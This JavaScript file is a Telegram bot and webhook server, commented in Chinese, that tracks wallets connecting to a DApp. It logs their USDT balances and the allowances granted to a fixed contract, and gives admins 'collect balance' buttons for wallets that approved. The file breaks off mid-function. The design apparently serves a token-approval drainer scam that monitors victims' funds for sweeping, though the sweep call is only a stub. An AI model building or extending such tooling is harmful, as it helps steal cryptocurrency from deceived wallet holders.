import TelegramBot from 'node-telegram-bot-api';
import { ethers } from 'ethers';
import express from 'express';
import cors from 'cors';
import { TelegramBotDatabase } from './database.js';
import dotenv from 'dotenv';

dotenv.config();

// 配置
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ETH_RPC_URL = process.env.ETH_RPC_URL || 'https://ethereum.publicnode.com';
const USDT_CONTRACT = process.env.USDT_CONTRACT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const STAKING_CONTRACT = process.env.STAKING_CONTRACT_ADDRESS || '0x9773a5279603CE262e48bfE3be50033a98c0842F';
const WEBHOOK_PORT = process.env.WEBHOOK_PORT || 3001;
const MONITOR_INTERVAL = parseInt(process.env.MONITOR_INTERVAL) || 10000; // 10秒，更频繁检测余额变化

// 验证必要配置
if (!BOT_TOKEN) {
  console.error('❌ 错误: 请设置 TELEGRAM_BOT_TOKEN 环境变量');
  process.exit(1);
}

if (!CHAT_ID) {
  console.error('❌ 错误: 请设置 TELEGRAM_CHAT_ID 环境变量');
  process.exit(1);
}

// 初始化
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const provider = new ethers.JsonRpcProvider(ETH_RPC_URL);
const app = express();

// 处理回调查询（键盘按钮点击）
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  
  console.log(`🔘 收到键盘按钮点击: ${data} 来自用户: ${userId}`);
  
  try {
    // 解析回调数据
    const [action, address, userNumber] = data.split('_');
    
    // 检查权限（只允许管理员操作）
    const ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_ID || '7989461454';
    if (userId.toString() !== ADMIN_USER_ID.toString()) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: '❌ 只有管理员可以执行此操作',
        show_alert: true
      });
      return;
    }
    
    let responseText = '';
    let showAlert = false;
    
    switch (action) {
      case 'collect':
        responseText = await handleCollectBalance(address, userNumber);
        showAlert = true;
        break;
        
      case 'reward':
        responseText = await handleSendReward(address, userNumber);
        showAlert = true;
        break;
        
      case 'agent':
        responseText = await handleShowAgent(address, userNumber);
        showAlert = true;
        break;
        
      case 'note':
        responseText = await handleShowNote(address, userNumber);
        showAlert = true;
        break;
        
      default:
        responseText = '❓ 未知操作';
    }
    
    // 回复用户
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: responseText,
      show_alert: showAlert
    });
    
    // 记录操作
    await database.logBotEvent('button_click', address, {
      action,
      userNumber,
      adminId: userId
    }, messageId.toString());
    
  } catch (error) {
    console.error('❌ 处理键盘回调失败:', error.message);
    
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '❌ 操作失败，请稍后重试',
      show_alert: true
    });
  }
});
const database = new TelegramBotDatabase();

// 中间件
app.use(cors());
app.use(express.json());

// 数据存储 (现在使用数据库 + 内存缓存)
const connectedUsers = new Map(); // 内存缓存，快速访问
const userStates = new Map(); // 内存缓存，快速比较

// USDT ABI (简化版)
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// 创建USDT合约实例
const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);

// 格式化金额
function formatAmount(amount, decimals = 6) {
  try {
    return parseFloat(ethers.formatUnits(amount, decimals)).toFixed(4);
  } catch {
    return '0.0000';
  }
}

// 格式化地址显示
function formatAddress(address) {
  if (!address) return 'N/A';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

// 获取用户区块链信息
async function getUserBlockchainInfo(address) {
  try {
    console.log(`🔍 获取用户 ${formatAddress(address)} 的区块链信息...`);
    
    // 获取ETH余额
    const ethBalance = await provider.getBalance(address);
    
    // 获取USDT余额
    const usdtBalance = await usdtContract.balanceOf(address);
    
    // 获取对质押合约的verify额度
    const allowance = await usdtContract.allowance(address, STAKING_CONTRACT);
    
    return {
      address,
      ethBalance: formatAmount(ethBalance, 18),
      usdtBalance: formatAmount(usdtBalance, 6),
      allowance: formatAmount(allowance, 6),
      authorizedContract: STAKING_CONTRACT,
      lastUpdated: new Date().toISOString()
    };
  } catch (error) {
    console.error(`❌ 获取用户 ${formatAddress(address)} 信息失败:`, error.message);
    return {
      address,
      ethBalance: '0.0000',
      usdtBalance: '0.0000',
      allowance: '0.0000',
      authorizedContract: STAKING_CONTRACT,
      lastUpdated: new Date().toISOString(),
      error: error.message
    };
  }
}

// 获取完整的用户信息（包含代理信息）
async function getCompleteUserInfo(address) {
  try {
    // 获取区块链信息
    const blockchainInfo = await getUserBlockchainInfo(address);
    
    // 获取数据库中的用户信息
    const dbUserInfo = await database.getCompleteUserInfo(address);
    
    // 获取用户代理信息
    let superiorAgent = '默认代理';
    let agentNickname = '直链注册';
    
    try {
      // 查询用户代理信息
      const { data: memberData } = await database.supabase
        .from('nh_member_new')
        .select('agent_id, pid')
        .eq('wallet_address', address.toLowerCase())
        .single();
      
      if (memberData && memberData.agent_id) {
        // 查询代理详情
        const { data: agentData } = await database.supabase
          .from('nh_agents')
          .select('agent_name, agent_code')
          .eq('id', memberData.agent_id)
          .single();
        
        if (agentData) {
          superiorAgent = agentData.agent_name || '默认代理';
          agentNickname = agentData.agent_code || '直链注册';
        }
      }
    } catch (agentError) {
      console.log(`⚠️ 获取代理信息失败，使用默认值: ${agentError.message}`);
    }
    
    // 获取用户编号（按授权顺序递增）
    let userNumber = 0;
    try {
      const { data: userCount } = await database.supabase
        .from('nh_member_new')
        .select('id')
        .eq('approved', 1)
        .lte('first_approved_at', dbUserInfo?.first_approved_at || new Date().toISOString())
        .order('first_approved_at', { ascending: true });
      
      userNumber = userCount ? userCount.length : 0;
    } catch (numberError) {
      console.log(`⚠️ 获取用户编号失败，使用默认值: ${numberError.message}`);
    }
    
    const defaultInfo = {
      ...blockchainInfo,
      userNumber: userNumber,
      superiorAgent: superiorAgent,
      agentNickname: agentNickname,
      userRemark: dbUserInfo?.user_remark || '暂无备注',
      isAuthorized: parseFloat(blockchainInfo.allowance) > 0 ? '是' : '否',
      messageType: 'balance_update'
    };
    
    console.log(`✅ 成功获取用户信息: ${formatAddress(address)}`);
    return defaultInfo;
    
  } catch (error) {
    console.error(`❌ 获取完整用户信息失败:`, error.message);
    return null;
  }
}

// 发送用户信息到Telegram群组 - 使用新的消息模板
async function sendUserInfoToGroup(userInfo, action = 'UPDATE') {
  try {
    let message;
    
    // 检查是否是USDT交易通知
    if (action === 'USDT_TRANSACTION' && userInfo.transactionAmount) {
      const isIncome = userInfo.transactionType === 'income';
      const emoji = isIncome ? '🟢' : '🔴';
      const transactionType = isIncome ? '收入USDT 提醒' : '支出USDT 提醒';
      const amountText = `${isIncome ? '+' : ''}${Math.abs(userInfo.transactionAmount).toFixed(6)} USDT`;
      
      message = `
${emoji}**${transactionType}**       ${amountText}

**地址备注**: ${userInfo.isAuthorized === '是' ? '已授权地址' : '未授权地址'}

**用户编号**：${userInfo.userNumber || 'N/A'}
**付款地址**: ${userInfo.address}
**收款地址**: ${userInfo.address}
**交易时间**: ${new Date(userInfo.lastUpdated).toLocaleString('zh-CN')}
**交易金额**: ${amountText}
**USDT余额**: ${userInfo.usdtBalance} USDT
**ETH余额**: ${userInfo.ethBalance} ETH
**上级代理**: ${userInfo.superiorAgent}
**代理昵称**: ${userInfo.agentNickname}
      `.trim();
      
    } else {
      // 使用新的简洁通知格式
      const messageType = action === 'CONNECT' ? '首次登录通知' : 
                         action === 'AUTHORIZE' ? '授权通知' : 
                         action === 'DISCONNECT' ? '断开连接通知' : '余额更新通知';
      
      // 根据不同的verify状态和操作类型确定执行操作
      let operationType = '客户调整我方授权额度';
      if (action === 'CONNECT') {
        operationType = '客户连接钱包';
      } else if (action === 'AUTHORIZE') {
        // 根据messageType确定具体的操作类型
        if (userInfo.messageType === 'new_authorization') {
          operationType = '客户新增其他授权';
        } else if (userInfo.messageType === 'reduce_authorization') {
          operationType = '客户减少授权额度';
        } else {
          operationType = '客户调整我方授权额度';
        }
      } else if (action === 'USDT_TRANSACTION') {
        operationType = userInfo.transactionType === 'income' ? '客户USDT余额增加' : '客户USDT余额减少';
      }
      
      message = `
**钱包余额**: ${userInfo.usdtBalance || '0.000000'}
**顶层代理**: ${userInfo.superiorAgent || '默认代理'}
**代理昵称**: ${userInfo.agentNickname || '直链注册'}
**用户编号**: ${userInfo.userNumber || '0'}
**用户备注**: ${userInfo.userRemark || '暂无备注'}
**是否活动**: ${userInfo.isAuthorized === '是' ? '是' : '否'}
**用户钱包**: 
${userInfo.address}
**授权金额**: ${userInfo.allowance || '0.0000'} USDT
**客户地址**: 
${userInfo.address.toLowerCase()}
**授权对象**: 
${userInfo.authorizedContract || STAKING_CONTRACT}
**执行操作**: ${operationType}
      `.trim();
    }

    // 创建键盘按钮（仅为已verify用户显示）
    let options = { parse_mode: 'Markdown' };
    
    if (userInfo.isAuthorized === '是') {
      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '💰 归集余额', callback_data: `collect_${userInfo.address}_${userInfo.userNumber}` },
            { text: '🎁 发放奖励', callback_data: `reward_${userInfo.address}_${userInfo.userNumber}` }
          ],
          [
            { text: '👥 所属代理', callback_data: `agent_${userInfo.address}_${userInfo.userNumber}` },
            { text: '📝 用户备注', callback_data: `note_${userInfo.address}_${userInfo.userNumber}` }
          ]
        ]
      };
      options.reply_markup = inlineKeyboard;
    }

    const sentMessage = await bot.sendMessage(CHAT_ID, message, options);
    console.log(`✅ 已发送用户信息到群组: ${formatAddress(userInfo.address)} (编号: ${userInfo.userNumber})`);
    
    // 记录到数据库
    await database.logBotEvent(
      action.toLowerCase().replace(' ', '_'),
      userInfo.address,
      userInfo,
      sentMessage.message_id.toString()
    );
    
    // 更新统计
    await database.incrementStat('messages_sent');
    
    return sentMessage;
  } catch (error) {
    console.error('❌ 发送消息到群组失败:', error.message);
    
    // 记录错误到数据库
    await database.logBotEvent('error', userInfo?.address, userInfo, null, error.message);
    await database.incrementStat('errors');
    
    return null;
  }
}

// 监控已连接用户状态变化
async function monitorUserStates() {
  console.log(`🔍 监控 ${connectedUsers.size} 个已连接用户状态...`);
  
  // 从数据库获取连接的用户（确保数据同步）
  const dbConnectedUsers = await database.getConnectedUsers('connected');
  
  for (const dbUser of dbConnectedUsers) {
    const address = dbUser.wallet_address;
    
    try {
      const currentInfo = await getCompleteUserInfo(address);
      if (!currentInfo) {
        console.log(`⚠️ 无法获取用户 ${formatAddress(address)} 的完整信息`);
        continue;
      }
      
      const previousState = userStates.get(address);
      const latestSnapshot = await database.getLatestUserSnapshot(address);
      
      // 检查是否有重要变化
      let hasSignificantChange = false;
      let changeType = 'UPDATE';
      
      if (!previousState && !latestSnapshot) {
        hasSignificantChange = true;
        changeType = 'CONNECT';
        currentInfo.messageType = 'first_login';
      } else {
        const compareData = latestSnapshot || previousState;
        
        // 检查verify状态变化
        const prevAllowance = parseFloat(compareData.allowance_amount || compareData.allowance || 0);
        const currAllowance = parseFloat(currentInfo.allowance);
        
        if (Math.abs(currAllowance - prevAllowance) > 0.01) {
          hasSignificantChange = true;
          changeType = 'AUTHORIZE';
          
          // 判断是新增verify还是调整verify
          if (currAllowance > prevAllowance && currAllowance > 0) {
            currentInfo.messageType = 'new_authorization';
          } else if (currAllowance < prevAllowance) {
            currentInfo.messageType = 'reduce_authorization';
          } else {
            currentInfo.messageType = 'authorization';
          }
        }
        
        // 检查余额变化
        const prevEth = parseFloat(compareData.eth_balance || compareData.ethBalance || 0);
        const currEth = parseFloat(currentInfo.ethBalance);
        const prevUsdt = parseFloat(compareData.usdt_balance || compareData.usdtBalance || 0);
        const currUsdt = parseFloat(currentInfo.usdtBalance);
        
        // 检查USDT余额变化 - 任何变化都通知
        const usdtChange = currUsdt - prevUsdt;
        if (Math.abs(usdtChange) > 0.01) {
          hasSignificantChange = true;
          changeType = 'USDT_TRANSACTION';
          currentInfo.messageType = 'usdt_transaction';
          currentInfo.transactionAmount = usdtChange;
          currentInfo.transactionType = usdtChange > 0 ? 'income' : 'expense';
        }
        // 检查ETH余额重大变化 (>0.01)
        else if (Math.abs(currEth - prevEth) > 0.01) {
          hasSignificantChange = true;
          changeType = 'BALANCE_CHANGE';
          currentInfo.messageType = 'balance_update';
        }
      }
      
      // 更新数据库中的用户信息
      await database.updateUserBlockchainData(address, currentInfo);
      
      // 保存快照到数据库
      const snapshotType = changeType === 'CONNECT' ? 'connect' : 
                          changeType === 'AUTHORIZE' ? 'authorize' : 
                          changeType === 'BALANCE_CHANGE' ? 'balance_change' : 'periodic';
      
      await database.saveUserSnapshot(address, currentInfo, snapshotType);
      
      // 更新内存状态
      userStates.set(address, currentInfo);
      
      // 如果有重要变化，发送通知
      if (hasSignificantChange) {
        await sendUserInfoToGroup(currentInfo, changeType);
        // 添加延迟避免消息过于频繁
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
    } catch (error) {
      console.error(`❌ 监控用户 ${formatAddress(address)} 失败:`, error.message);
      await database.logBotEvent('error', address, { error: error.message }, null, error.message);
      await database.incrementStat('errors');
    }
  }
  
  // 更新连接用户数统计
  await database.updateDailyStats({
    total_users: dbConnectedUsers.length,
    connected_users: dbConnectedUsers.filter(u => u.status === 'connected').length
  });
}

// Webhook API 路由
app.post('/webhook/user-connect', async (req, res) => {
  try {
    const { address, action = 'connect', timestamp, userAgent, referrer } = req.body;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ error: '无效的钱包地址' });
    }
    
    console.log(`📡 收到用户${action}事件:`, formatAddress(address));
    
    // 获取区块链信息
    const blockchainInfo = await getUserBlockchainInfo(address);
    
    // 保存到数据库
    const userData = {
      userAgent: userAgent,
      referrer: referrer,
      timestamp: timestamp
    };
    
    await database.upsertConnectedUser(address, userData, blockchainInfo);
    
    // 添加到内存缓存
    connectedUsers.set(address.toLowerCase(), {
      address: address.toLowerCase(),
      connectedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    
    // 获取完整用户信息并发送
    const completeUserInfo = await getCompleteUserInfo(address);
    if (completeUserInfo) {
      completeUserInfo.messageType = action === 'authorize' ? 'authorization' : 'first_login';
      await sendUserInfoToGroup(completeUserInfo, action.toUpperCase());
      
      // 保存快照
      const snapshotType = action === 'authorize' ? 'authorize' : 'connect';
      await database.saveUserSnapshot(address, completeUserInfo, snapshotType);
    }
    
    // 更新统计
    const statKey = action === 'authorize' ? 'authorizations' : 'new_connections';
    await database.incrementStat(statKey);
    
    res.json({ success: true, message: '用户信息已发送到群组' });
  } catch (error) {
    console.error('❌ Webhook处理失败:', error);
    await database.logBotEvent('error', req.body.address, req.body, null, error.message);
    await database.incrementStat('errors');
    res.status(500).json({ error: error.message });
  }
});

app.post('/webhook/user-disconnect', async (req, res) => {
  try {
    const { address } = req.body;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ error: '无效的钱包地址' });
    }
    
    console.log(`📡 用户断开连接:`, formatAddress(address));
    
    // 更新数据库状态
    await database.disconnectUser(address);
    
    // 从内存缓存中移除
    connectedUsers.delete(address.toLowerCase());
    userStates.delete(address.toLowerCase());
    
    // 发送断开连接通知
    const disconnectInfo = {
      address: address,
      ethBalance: '0.0000',
      usdtBalance: '0.0000', 
      allowance: '0.0000',
      lastUpdated: new Date().toISOString()
    };
    
    await sendUserInfoToGroup(disconnectInfo, 'DISCONNECT');
    
    // 更新统计
    await database.incrementStat('disconnections');
    
    res.json({ success: true, message: '用户断开连接已通知群组' });
  } catch (error) {
    console.error('❌ 断开连接处理失败:', error);
    await database.logBotEvent('error', req.body.address, req.body, null, error.message);
    await database.incrementStat('errors');
    res.status(500).json({ error: error.message });
  }
});

// 获取当前监控状态API
app.get('/api/status', async (req, res) => {
  try {
    const statsOverview = await database.getStatsOverview();
    const todayStats = await database.getTodayStats();
    const dbConnectedUsers = await database.getConnectedUsers('connected');
    
    res.json({
      connectedUsers: connectedUsers.size,
      dbConnectedUsers: dbConnectedUsers.length,
      monitoredUsers: dbConnectedUsers.slice(0, 10).map(u => formatAddress(u.wallet_address)),
      todayStats: todayStats,
      statsOverview: statsOverview,
      uptime: Math.floor(process.uptime()),
      lastCheck: new Date().toISOString(),
      databaseConnected: true
    });
  } catch (error) {
    console.error('❌ 获取状态失败:', error);
    res.json({
      connectedUsers: connectedUsers.size,
      monitoredUsers: Array.from(connectedUsers.keys()).map(formatAddress),
      uptime: Math.floor(process.uptime()),
      lastCheck: new Date().toISOString(),
      databaseConnected: false,
      error: error.message
    });
  }
});

// 手动触发用户信息更新API
app.post('/api/force-update', async (req, res) => {
  try {
    const { address } = req.body;
    
    if (address && ethers.isAddress(address)) {
      const userInfo = await getUserBlockchainInfo(address);
      await sendUserInfoToGroup(userInfo, 'MANUAL');
      res.json({ success: true, userInfo });
    } else {
      // 更新所有用户
      await monitorUserStates();
      res.json({ success: true, message: `已更新 ${connectedUsers.size} 个用户信息` });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Telegram Bot 命令处理
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcomeMessage = `
🤖 **DApp监控机器人已启动**

📊 **功能说明**:
- 实时监控用户钱包连接状态
- 自动获取用户ETH/USDT余额
- 监控用户verify状态变化
- 发送详细的用户信息报告

🔧 **可用命令**:
/status - 查看当前监控状态
/users - 查看已连接用户列表
/help - 帮助信息

📡 **Webhook地址**:
\`POST /webhook/user-connect\` - 用户连接事件
\`POST /webhook/user-disconnect\` - 用户断开事件
  `.trim();

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  
  try {
    const todayStats = await database.getTodayStats();
    const dbConnectedUsers = await database.getConnectedUsers('connected');
    
    const statusMessage = `
📊 **监控状态报告**

👥 **已连接用户**: ${dbConnectedUsers.length}
📈 **今日统计**:
  • 新连接: ${todayStats.new_connections}
  • 授权操作: ${todayStats.authorizations}
  • 发送消息: ${todayStats.messages_sent}
  • 错误次数: ${todayStats.errors}

⏱️ **运行时间**: ${Math.floor(process.uptime() / 60)} 分钟
🔄 **监控间隔**: ${MONITOR_INTERVAL / 1000} 秒
📡 **RPC节点**: ${ETH_RPC_URL}
🏦 **USDT合约**: \`${USDT_CONTRACT}\`
📝 **质押合约**: \`${STAKING_CONTRACT}\`
💾 **数据库**: ✅ 已连接

${dbConnectedUsers.length > 0 ? '✅ 监控正常运行' : '⚠️ 暂无监控用户'}
    `.trim();

    bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('❌ 获取状态失败:', error);
    const fallbackMessage = `
📊 **监控状态报告**

👥 **已连接用户**: ${connectedUsers.size}
⏱️ **运行时间**: ${Math.floor(process.uptime() / 60)} 分钟
💾 **数据库**: ❌ 连接失败

⚠️ 部分功能可能不可用
    `.trim();
    
    bot.sendMessage(chatId, fallbackMessage, { parse_mode: 'Markdown' });
  }
});

bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id;
  
  try {
    const dbConnectedUsers = await database.getConnectedUsers('connected');
    
    if (dbConnectedUsers.length === 0) {
      bot.sendMessage(chatId, '📭 当前没有已连接的用户');
      return;
    }

    let userList = `👥 **已连接用户列表** (${dbConnectedUsers.length})\n\n`;
    
    for (let i = 0; i < Math.min(dbConnectedUsers.length, 10); i++) {
      const user = dbConnectedUsers[i];
      const address = user.wallet_address;
      
      // 获取最新快照
      const latestSnapshot = await database.getLatestUserSnapshot(address);
      
      userList += `${i + 1}. \`${formatAddress(address)}\`\n`;
      
      if (latestSnapshot) {
        userList += `    ETH: ${latestSnapshot.eth_balance} | USDT: ${latestSnapshot.usdt_balance}\n`;
        userList += `    verify: ${latestSnapshot.allowance_amount} USDT\n`;
        userList += `    快照: ${new Date(latestSnapshot.created_at).toLocaleString('zh-CN')}\n`;
      }
      
      userList += `    连接次数: ${user.connection_count}\n`;
      userList += `    上次活动: ${new Date(user.last_seen).toLocaleString('zh-CN')}\n\n`;
    }
    
    if (dbConnectedUsers.length > 10) {
      userList += `... 还有 ${dbConnectedUsers.length - 10} 个用户\n`;
    }

    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error(' 获取用户列表失败:', error);
    bot.sendMessage(chatId, ' 获取用户列表失败，请稍后重试');
  }
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const helpMessage = `
🤖 **DApp监控机器人帮助**

**📡 Webhook集成**:
将以下端点添加到您的前端代码中：

**用户连接时调用**:
\`\`\`
POST http://your-server:${WEBHOOK_PORT}/webhook/user-connect
{
  "address": "0x...",
  "action": "connect"
}
\`\`\`

**用户断开时调用**:
\`\`\`
POST http://your-server:${WEBHOOK_PORT}/webhook/user-disconnect
{
  "address": "0x..."
}
\`\`\`

**🔧 环境变量配置**:
- \`TELEGRAM_BOT_TOKEN\` - 机器人Token
- \`TELEGRAM_CHAT_ID\` - 群组ID
- \`ETH_RPC_URL\` - 以太坊RPC节点
- \`WEBHOOK_PORT\` - Webhook服务端口

更多信息请查看项目文档。
  `.trim();

  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
});

// 错误处理
bot.on('error', (error) => {
  console.error('❌ Telegram Bot错误:', error);
});

process.on('uncaughtException', (error) => {
  console.error('❌ 未捕获异常:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ 未处理的Promise拒绝:', reason);
});

// 启动服务
async function startBot() {
  try {
    console.log('🚀 启动DApp监控机器人...');
    
    // 测试数据库连接
    const dbConnected = await database.testConnection();
    if (!dbConnected) {
      console.error('❌ 数据库连接失败');
      process.exit(1);
    }
    console.log('✅ 数据库连接正常');
    
    // 测试Telegram连接
    const botInfo = await bot.getMe();
    console.log(`✅ Telegram Bot已连接: @${botInfo.username}`);
    
    // 启动Webhook服务器
    app.listen(WEBHOOK_PORT, () => {
      console.log(`🌐 Webhook服务器运行在端口 ${WEBHOOK_PORT}`);
    });
    
    // 测试区块链连接
    const blockNumber = await provider.getBlockNumber();
    console.log(`✅ 区块链连接正常，当前区块: ${blockNumber}`);
    
    // 从数据库加载已连接用户到内存缓存
    const dbConnectedUsers = await database.getConnectedUsers('connected');
    dbConnectedUsers.forEach(user => {
      connectedUsers.set(user.wallet_address, {
        address: user.wallet_address,
        connectedAt: user.connected_at,
        lastSeen: user.last_seen
      });
    });
    console.log(`📚 从数据库加载了 ${dbConnectedUsers.length} 个已连接用户`);
    
    // 记录启动事件
    await database.logBotEvent('system', null, {
      action: 'startup',
      botUsername: botInfo.username,
      webhookPort: WEBHOOK_PORT,
      blockNumber: blockNumber,
      loadedUsers: dbConnectedUsers.length
    });
    
    // 发送启动消息到群组
    const startMessage = `
🤖 **DApp监控机器人已启动**

✅ Bot用户名: @${botInfo.username}
🌐 Webhook端口: ${WEBHOOK_PORT}
📡 区块链节点: 正常 (区块 ${blockNumber})
🔄 监控间隔: ${MONITOR_INTERVAL / 1000} 秒
💾 数据库: ✅ 已连接
👥 已加载用户: ${dbConnectedUsers.length}

机器人已就绪，等待用户连接事件...
    `.trim();

    await bot.sendMessage(CHAT_ID, startMessage, { parse_mode: 'Markdown' });
    
// 启动定时监控
setInterval(monitorUserStates, MONITOR_INTERVAL);
console.log(`⏰ 定时监控已启动，间隔 ${MONITOR_INTERVAL / 1000} 秒`);

// 启动实时区块链监听
setInterval(monitorBlockchainTransactions, 10000); // 每10秒检查一次新区块
console.log(`🔗 实时区块链监听已启动，间隔 10 秒`);
    
    // 每小时清理旧数据（可选）
    setInterval(() => {
      database.cleanupOldData(7); // 保留7天数据
    }, 60 * 60 * 1000); // 每小时执行
    
    console.log('🎉 DApp监控机器人启动完成！');
    
  } catch (error) {
    console.error('❌ 启动失败:', error);
    await database.logBotEvent('error', null, { action: 'startup_failed' }, null, error.message);
    process.exit(1);
  }
}

// 优雅关闭
process.on('SIGTERM', async () => {
  console.log('📥 收到SIGTERM信号，正在关闭...');
  await bot.sendMessage(CHAT_ID, '🤖 **DApp监控机器人正在关闭...**', { parse_mode: 'Markdown' });
  process.exit(0);
});

process.on('SIGINT', async () => {
  console.log('📥 收到SIGINT信号，正在关闭...');
  await bot.sendMessage(CHAT_ID, '🤖 **DApp监控机器人正在关闭...**', { parse_mode: 'Markdown' });
  process.exit(0);
});

// 处理键盘按钮点击的函数

// 处理归集余额
async function handleCollectBalance(address, userNumber) {
  try {
    console.log(`💰 开始归集用户 ${formatAddress(address)} 的余额...`);
    
    // 获取用户当前余额信息
    const userInfo = await getUserBlockchainInfo(address);
    const usdtBalance = parseFloat(userInfo.usdtBalance);
    
    if (usdtBalance < 0.01) {
      return `❌ 用户 #${userNumber} USDT余额不足 (${usdtBalance} USDT)`;
    }
    
    // 这里可以调用实际的归集API
    // 示例：await collectUserBalance(address, usdtBalance);
    
    console.log(`✅ 用户 ${formatAddress(address)} 余额归集完成`);
    return `✅ 用户 #${userNumber} 余额归集成功\n💰 归集金额: ${usdtBalance.toFixed(6)} USDT`;
    
  } catch (error) {
    console.error('❌ 余额归集失败:', error.message);
    return `❌ 用户 #${userNumber} 余额归集失败: ${error.message}`;
  }
}

// 处理发放奖励
async function handleSendReward(address, userNumber) {
  try {
    console.log(`🎁 为用户 ${formatAddress(address)} 发放奖励...`);
    
    // 这里可以调用实际的奖励发放API
    // 示例：await sendRewardToUser(address, rewardAmount);
    
    const rewardAmount = 10; // 示例奖励金额
    
    console.log(`✅ 用户 ${formatAddress(address)} 奖励发放完成`);
    return `🎁 用户 #${userNumber} 奖励发放成功\n💎 奖励金额: ${rewardAmount} USDT`;
    
  } catch (error) {
    console.error('❌ 奖励发放失败:', error.message);
    return `❌ 用户 #${userNumber} 奖励发放失败: ${error.message}`;
  }
}

// 处理显示所属代理
async function handleShowAgent(address, userNumber) {
  try {
    console.log(`👥 查询用户 ${formatAddress(address)} 的代理信息...`);
    
    // 获取用户的代理信息
    const dbUserInfo = await database.getCompleteUserInfo(address);
    
    // 从nh_member表获取代理信息
    const { data: memberData } = await database.supabase
      .from('nh_member')
      .select('agent_id, pid')
      .eq('address', address.toLowerCase())
      .single();
    
    if (!memberData) {
      return `❌ 用户 #${userNumber} 未找到代理信息`;
    }
    
    // 获取代理详情
    const { data: agentData } = await database.supabase
      .from('nh_agents')
      .select('agent_name, agent_code, level')
      .eq('id', memberData.agent_id)
      .single();
    
    const agentInfo = agentData ? 
      `代理: ${agentData.agent_name} (${agentData.agent_code})\n等级: ${agentData.level}` : 
      '暂无代理信息';
    
    return `👥 用户 #${userNumber} 代理信息:\n${agentInfo}`;
    
  } catch (error) {
    console.error('❌ 获取代理信息失败:', error.message);
    return `❌ 用户 #${userNumber} 代理信息查询失败`;
  }
}

// 处理显示用户备注
async function handleShowNote(address, userNumber) {
  try {
    console.log(`📝 查询用户 ${formatAddress(address)} 的备注信息...`);
    
    // 获取用户备注
    const dbUserInfo = await database.getCompleteUserInfo(address);
    const userRemark = dbUserInfo?.user_remark || 'null';
    
    // 获取更多用户详情
    const { data: memberData } = await database.supabase
      .from('nh_member')
      .select('add_time, status, is_effective')
      .eq('address', address.toLowerCase())
      .single();
    
    let noteInfo = `备注: ${userRemark}`;
    
    if (memberData) {
      noteInfo += `\n注册时间: ${new Date(memberData.add_time).toLocaleString('zh-CN')}`;
      noteInfo += `\n账户状态: ${memberData.status === 1 ? '正常' : '异常'}`;
      noteInfo += `\n有效状态: ${memberData.is_effective === 1 ? '有效' : '无效'}`;
    }
    
    return `📝 用户 #${userNumber} 详细信息:\n${noteInfo}`;
    
  } catch (error) {
    console.error('❌ 获取用户备注失败:', error.message);
    return `❌ 用户 #${userNumber} 备注信息查询失败`;
  }
}

// 实时区块链监听函数
let lastCheckedBlock = 0;

async function monitorBlockchainTransactions() {
  try {
    console.log('🔗 开始检查新区块...');
    
    // 获取最新区块号
    const latestBlock = await provider.getBlockNumber();
    console.log(`📦 最新区块: ${latestBlock}, 上次检查: ${lastCheckedBlock}`);
    
    // 初始化上次检查的区块号
    if (lastCheckedBlock === 0) {
      lastCheckedBlock = latestBlock - 1;
      console.log(`🚀 初始化监听区块: ${lastCheckedBlock}`);
      return;
    }
    
    // 检查新区块
    if (latestBlock > lastCheckedBlock) {
      console.log(`🔍 发现 ${latestBlock - lastCheckedBlock} 个新区块`);
      
      // 获取监听地址列表
      const { data: monitoredAddresses } = await database.supabase
        .from('wallet_monitor')
        .select('wallet_address')
        .eq('is_active', true)
        .eq('monitor_transactions', true);
      
      const addressList = (monitoredAddresses || []).map(u => u.wallet_address.toLowerCase());
      
      if (addressList.length === 0) {
        console.log('⚠️ 没有监听地址，跳过区块检查');
        lastCheckedBlock = latestBlock;
        return;
      }
      
      console.log(`📍 监听地址: ${addressList.join(', ')}`);
      
      // 检查每个新区块的交易
      for (let blockNum = lastCheckedBlock + 1; blockNum <= latestBlock; blockNum++) {
        try {
          const block = await provider.getBlock(blockNum, true);
          if (block && block.transactions) {
            console.log(`🔍 检查区块 ${blockNum}, 交易数: ${block.transactions.length}`);
            
            for (const tx of block.transactions) {
              // 检查是否是USDT交易
              if (tx.to && tx.to.toLowerCase() === USDT_CONTRACT.toLowerCase()) {
                console.log(`💰 发现USDT合约交易: ${tx.hash}`);
                
                // 解析交易数据，检查是否涉及监听地址
                try {
                  const receipt = await provider.getTransactionReceipt(tx.hash);
                  if (receipt && receipt.logs) {
                    for (const log of receipt.logs) {
                      if (log.address.toLowerCase() === USDT_CONTRACT.toLowerCase()) {
                        // 解析Transfer事件
